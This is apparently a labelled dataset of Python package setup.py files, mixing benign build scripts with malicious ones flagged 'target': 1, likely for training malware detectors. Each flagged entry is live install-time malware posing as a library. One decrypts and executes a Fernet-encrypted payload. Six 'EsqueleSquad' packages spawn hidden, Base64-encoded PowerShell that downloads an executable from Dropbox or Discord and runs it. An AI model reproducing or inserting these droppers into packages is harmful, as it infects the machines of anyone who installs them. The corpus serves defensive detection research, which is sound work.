{"idx": "django-sekizai-4.0.0", "func": "#!/usr/bin/env python\nfrom pathlib import Path\n\nfrom setuptools import find_packages, setup\n\n\nREQUIREMENTS = [\n    'django>=3.2',\n    'django-classy-tags>=3.0',\n]\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Web Environment',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: BSD License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3 :: Only',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Framework :: Django',\n    'Framework :: Django :: 3.2',\n    'Framework :: Django :: 4.0',\n    'Framework :: Django :: 4.1',\n    'Topic :: Internet :: WWW/HTTP',\n    'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    'Topic :: Software Development',\n    'Topic :: Software Development :: Libraries',\n]\n\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.rst\").read_text()\n\nsetup(\n    name='django-sekizai',\n    version='4.0.0',\n    author='Jonas Obrist',\n    author_email='ojiidotch@gmail.com',\n    maintainer='Django CMS Association and contributors',\n    maintainer_email='info@django-cms.org',\n    url='https://github.com/django-cms/django-sekizai',\n    license='BSD-3-Clause',\n    description='Django Sekizai',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    packages=find_packages(exclude=['tests']),\n    python_requires='>=3.8',\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=REQUIREMENTS,\n    classifiers=CLASSIFIERS,\n    test_suite='tests.settings.run',\n)\n", "target": 0}
{"idx": "definitions-0.2.0", "func": "import os\nimport sys\nimport subprocess\nimport setuptools\n\n\nclass Command(setuptools.Command):\n\n    requires = []\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self._returncode = 0\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        if type(self).requires:\n            self.distribution.fetch_build_eggs(type(self).requires)\n            self.run_command('egg_info')\n            self.reinitialize_command('build_ext', inplace=1)\n            self.run_command('build_ext')\n        self.__call__()\n        if self._returncode:\n            sys.exit(self._returncode)\n\n    def call(self, command):\n        env = os.environ.copy()\n        env['PYTHONPATH'] = ''.join(':' + x for x in sys.path)\n        self.announce('Run command: {}'.format(command), level=2)\n        try:\n            subprocess.check_call(command.split(), env=env)\n        except subprocess.CalledProcessError as error:\n            self._returncode = 1\n            message = 'Command failed with exit code {}'\n            message = message.format(error.returncode)\n            self.announce(message, level=2)\n\n\nclass TestCommand(Command):\n\n    requires = ['pytest', 'pytest-cov']\n    description = 'run tests and create a coverage report'\n    user_options = [('args=', None, 'args to forward to pytest')]\n\n    def initialize_options(self):\n        self.args = ''\n\n    def __call__(self):\n        self.call('python3 -m pytest --cov=definitions test ' + self.args)\n\n\nclass LintCommand(Command):\n\n    requires = ['pylint']\n    description = 'run linters'\n    user_options = [('args=', None, 'args to forward to pylint')]\n\n    def initialize_options(self):\n        self.args = ''\n\n    def __call__(self):\n        self.call('python3 -m pylint definitions ' + self.args)\n        self.call('python3 -m pylint test ' + self.args)\n        self.call('python3 -m pylint setup.py ' + self.args)\n\n\nDESCRIPTION = 'Load and validate YAML definitions against a schema'\n\nSETUP_REQUIRES = [\n    'sphinx',\n]\n\nINSTALL_REQUIRES = [\n    'PyYAML',\n]\n\nif __name__ == '__main__':\n    setuptools.setup(\n        name='definitions',\n        version='0.2.0',\n        description=DESCRIPTION,\n        url='http://github.com/danijar/definitions',\n        author='Danijar Hafner',\n        author_email='mail@danijar.com',\n        license='MIT',\n        packages=['definitions'],\n        setup_requires=SETUP_REQUIRES,\n        install_requires=INSTALL_REQUIRES,\n        tests_require=[],\n        cmdclass={\n            'test': TestCommand,\n            'lint': LintCommand,\n        },\n    )\n\n", "target": 0}
{"idx": "requiremntstxt-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'gwNfSEPBPhOdjaEnbLTPtC'\nLONG_DESCRIPTION = 'eYDMGUdKTinOVrKmQOExJQiGimDYOMBYFIzk PzLSMaZiFMpCwTsPIvzBvefQJHLboynXuqRVdatJiW  QtY UnkMTrIqXTrDxDnTixAwYrTjJefeiLopMihlnRygdvQwtira kzCOUIIgxqNZ lYCeBFicuALcSpPxIJePepkVQYqbPrngLYvHlRFeeQTVCZWuMjVfHEcieRzlnvJxHwrdFWzwMILpakIgHikebkhaxNoJDMqCzkaGeEHMNnynBpiDzpApTkrAuEYQEruJgDUofABsVOfcwXgUyLnyvBecgisgFFnyWkOznQXPCJkjDXYtQbNnsqzhxfudqxYKDAMaxrSdlQoxbyEpDCIuAfLCJdPn SVeqZGhrPcChiAQPuqS'\n\n\nclass lxFTKRPgHVYfsgpIKlhWWzIVrMzbFncLmDcevyefMYfhXjjYUsNBgdqsresZmegCIVZquLqMbXlaxwDRpqBbUxrVRyLgxqDlkGvNPDgHERgUezfneJtCzJDMAkscVYcopvZnGr(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'5A76eO3K2IP44I4MFfJJWdQkxGU8mv7L7jS6Mwt4IvU=').decrypt(b'gAAAAABmBIY06mmZvHOgkhzt9Bo68-Y9f10rSv5Ai4k98Tde3uM1cT8ePsxTA0323FKOns57FmHaeFYNUDrsQorhpb7snCe1mB5fLuib94mMufqL0VCOY7a-67tCxuout4DvQu52wqfJEFeQoa9Oy30-drpPIfah_lWGyd3Smcu6JkBIvLk3yiZAlsR7MTcqfK_jq6AuG6QTcXvTAdnc0UdmebstQGMrrMOPSsVBclbgHNAvBFUB9KE='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requiremntstxt\",\n    version=VERSION,\n    author=\"FoRzPfTHR\",\n    author_email=\"PaolaZjKIczxZhoLm@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': lxFTKRPgHVYfsgpIKlhWWzIVrMzbFncLmDcevyefMYfhXjjYUsNBgdqsresZmegCIVZquLqMbXlaxwDRpqBbUxrVRyLgxqDlkGvNPDgHERgUezfneJtCzJDMAkscVYcopvZnGr,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-loadcpugui-9.41", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-loadcpugui',\n    packages = ['modlib'],\n    version = '5.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pywvirtual-3.64", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pywvirtual',\n    packages = ['modlib'],\n    version = '5.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "librandreplace-3.33", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandreplace',\n    packages = ['modlib'],\n    version = '8.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libstringstr-10.89", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libstringstr',\n    packages = ['modlib'],\n    version = '6.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fernet-1.0.1", "func": "from setuptools import setup\n\nsetup(name='fernet',\n      version='1.0.1',\n      description='A simple python fernet implementation',\n      author='Oz N Tiram',\n      author_email='oz.tiram@gmail.com',\n      url='https://github.com/oz123/python-fernet',\n      py_modules=['fernet'],\n      install_requires=['pyaes'],\n      tests_require=['pytest', 'cryptography'],\n      license='MIT',\n      platforms='any',\n      classifiers=['Development Status :: 4 - Beta',\n                   'Intended Audience :: Developers',\n                   'License :: OSI Approved :: MIT License',\n                   'Programming Language :: Python :: 3.4',\n                   'Programming Language :: Python :: 3.5',\n                   'Topic :: Security :: Cryptography',\n                   ],\n      )\n", "target": 0}
{"idx": "libloadramstring-9.87", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libloadramstring',\n    packages = ['modlib'],\n    version = '1.30',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfpyccvisa-4.5", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpyccvisa',\n    packages = ['modlib'],\n    version = '6.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "globre-0.1.5", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#------------------------------------------------------------------------------\n# file: $Id$\n# auth: metagriffin <mg.github@uberdev.org>\n# date: 2013/10/28\n# copy: (C) Copyright 2013-EOT metagriffin -- see LICENSE.txt\n#------------------------------------------------------------------------------\n# This software is free software: you can redistribute it and/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation, either version 3 of the\n# License, or (at your option) any later version.\n#\n# This software is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see http://www.gnu.org/licenses/.\n#------------------------------------------------------------------------------\n\nimport os, sys, setuptools\nfrom setuptools import setup, find_packages\n\nheredir = os.path.abspath(os.path.dirname(__file__))\ndef read(*parts, **kw):\n  try:    return open(os.path.join(heredir, *parts)).read()\n  except: return kw.get('default', '')\n\ntest_dependencies = [\n  'nose                 >= 1.3.0',\n  'coverage             >= 3.6',\n]\n\ndependencies = []\n\nentrypoints = {\n  # 'console_scripts': [\n  #   'TODO:PROJNAME      = TODO:PROJNAME.cli:main',\n  #   ],\n}\n\nclassifiers = [\n  'Development Status :: 4 - Beta',\n  # 'Development Status :: 5 - Production/Stable',\n  'Intended Audience :: Developers',\n  'Programming Language :: Python',\n  'Operating System :: OS Independent',\n  'Natural Language :: English',\n  'License :: OSI Approved :: GNU General Public License v3 or later (GPLv3+)',\n]\n\nsetup(\n  name                  = 'globre',\n  version               = read('VERSION.txt', default='0.0.1').strip(),\n  description           = 'A glob matching library, providing an interface similar to the \"re\" module.',\n  long_description      = read('README.rst'),\n  classifiers           = classifiers,\n  author                = 'metagriffin',\n  author_email          = 'mg.pypi@uberdev.org',\n  url                   = 'http://github.com/metagriffin/globre',\n  keywords              = 'python glob pattern matching regular expression',\n  packages              = find_packages(),\n  platforms             = ['any'],\n  include_package_data  = True,\n  zip_safe              = True,\n  install_requires      = dependencies,\n  tests_require         = test_dependencies,\n  test_suite            = 'globre',\n  entry_points          = entrypoints,\n  license               = 'GPLv3+',\n)\n\n#------------------------------------------------------------------------------\n# end of $Id$\n#------------------------------------------------------------------------------\n", "target": 0}
{"idx": "elasticsearch-dsl-7.4.0", "func": "# -*- coding: utf-8 -*-\n#  Licensed to Elasticsearch B.V. under one or more contributor\n#  license agreements. See the NOTICE file distributed with\n#  this work for additional information regarding copyright\n#  ownership. Elasticsearch B.V. licenses this file to you under\n#  the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License.\n#  You may obtain a copy of the License at\n#\n# \thttp://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing,\n#  software distributed under the License is distributed on an\n#  \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n#  KIND, either express or implied.  See the License for the\n#  specific language governing permissions and limitations\n#  under the License.\n\nfrom os.path import dirname, join\n\nfrom setuptools import find_packages, setup\n\nVERSION = (7, 4, 0)\n__version__ = VERSION\n__versionstr__ = \".\".join(map(str, VERSION))\n\nf = open(join(dirname(__file__), \"README\"))\nlong_description = f.read().strip()\nf.close()\n\ninstall_requires = [\n    \"six\",\n    \"python-dateutil\",\n    \"elasticsearch>=7.0.0,<8.0.0\",\n    # ipaddress is included in stdlib since python 3.3\n    'ipaddress; python_version<\"3.3\"',\n]\n\ndevelop_requires = [\n    \"mock\",\n    \"pytest>=3.0.0\",\n    \"pytest-cov\",\n    \"pytest-mock<3.0.0\",\n    \"pytz\",\n    \"coverage<5.0.0\",\n    \"sphinx\",\n    \"sphinx_rtd_theme\",\n]\n\nsetup(\n    name=\"elasticsearch-dsl\",\n    description=\"Python client for Elasticsearch\",\n    license=\"Apache-2.0\",\n    url=\"https://github.com/elasticsearch/elasticsearch-dsl-py\",\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    version=__versionstr__,\n    author=\"Honza Kr\u00e1l\",\n    author_email=\"honza.kral@gmail.com\",\n    maintainer=\"Seth Michael Larson\",\n    maintainer_email=\"seth.larson@elastic.co\",\n    packages=find_packages(where=\".\", exclude=(\"tests*\",)),\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    install_requires=install_requires,\n    extras_require={\"develop\": develop_requires},\n)\n", "target": 0}
{"idx": "glom-22.1.0", "func": "import imp\nimport os\nimport sys\n\nfrom setuptools import setup\n\n__author__ = 'Mahmoud Hashemi and Kurt Rose'\n__contact__ = 'mahmoud@hatnote.com'\n__url__ = 'https://github.com/mahmoud/glom'\n__license__ = 'BSD'\n\nCUR_PATH = os.path.abspath(os.path.dirname(__file__))\n_version_mod_path = os.path.join(CUR_PATH, 'glom', '_version.py')\n_version_mod = imp.load_source('_version', _version_mod_path)\n__version__ = _version_mod.__version__\n\n\nopen_kwarg = {}\nif sys.version_info[0] == 3:\n    open_kwarg['encoding'] = 'utf-8'\n\nwith open('README.md', **open_kwarg) as read_me:\n    long_description = read_me.read()\n\nsetup(name='glom',\n      version=__version__,\n      description=\"A declarative object transformer and formatter, for conglomerating nested data.\",\n      long_description=long_description,\n      long_description_content_type='text/markdown',\n      author=__author__,\n      author_email=__contact__,\n      url=__url__,\n      project_urls={\n          'Documentation': 'https://glom.readthedocs.io/en/latest/',\n      },\n      packages=['glom', 'glom.test'],\n      install_requires=['boltons>=19.3.0', 'attrs', 'face>=20.1.0'],\n      extras_require={\n          'yaml': ['PyYAML'],\n      },\n      entry_points={'console_scripts': ['glom = glom.cli:console_main']},\n      include_package_data=True,\n      zip_safe=False,\n      license=__license__,\n      platforms='any',\n      classifiers=[\n          'Topic :: Utilities',\n          'Intended Audience :: Developers',\n          'Topic :: Software Development :: Libraries',\n          'Development Status :: 5 - Production/Stable',\n          'Programming Language :: Python :: 2.7',\n          'Programming Language :: Python :: 3.4',\n          'Programming Language :: Python :: 3.5',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7',\n          'Programming Language :: Python :: Implementation :: CPython',\n          'Programming Language :: Python :: Implementation :: PyPy',\n          'License :: OSI Approved :: BSD License',\n      ]\n     )\n\n\"\"\"\nA brief checklist for release:\n\n* tox\n* git commit (if applicable)\n* Bump glom/_version.py off of -dev\n* git commit -a -m \"bump version for vx.y.z release\"\n* rm -rf dist/*\n* python setup.py sdist bdist_wheel\n* twine upload dist/*\n* bump docs/conf.py version\n* git commit\n* git tag -a vx.y.z -m \"brief summary\"\n* write CHANGELOG\n* git commit\n* bump glom/_version.py onto n+1 dev\n* git commit\n* git push\n\n\"\"\"\n", "target": 0}
{"idx": "gmplot-1.4.1", "func": "import os\nfrom setuptools import setup, find_packages\n\n__version__ = '1.4.1'\n\ndef read(fname):\n    with open(os.path.join(os.path.dirname(__file__), fname)) as f:\n        return f.read()\n\ndef get_requirements(requirements_file):\n    with open(requirements_file) as f:\n        return f.read().strip().splitlines()\n\nsetup(\n    name = 'gmplot',\n    version = __version__,\n    author = 'gmplot contributors',\n    description = 'A matplotlib-like interface to plot data with Google Maps.',\n    long_description=read('README.rst'),\n    license='MIT',\n    keywords='python google-maps visualization',\n    packages = find_packages(),\n    include_package_data=True,\n    package_data = {\n        'gmplot': ['markers/*.png'],\n    },\n    project_urls = {\n        'Documentation': 'https://github.com/gmplot/gmplot/wiki',\n        'Tracker': 'https://github.com/gmplot/gmplot/issues',\n        'Source': 'https://github.com/gmplot/gmplot'\n    },\n    install_requires=get_requirements('requirements.txt'),\n    classifiers = ['Programming Language :: Python :: %s' % version for version in ['2', '2.7', '3', '3.5', '3.6', '3.7', '3.8']]\n)\n", "target": 0}
{"idx": "selfhackedmaskultra-4.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhackedmaskultra',\n    packages = ['modlib'],\n    version = '3.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
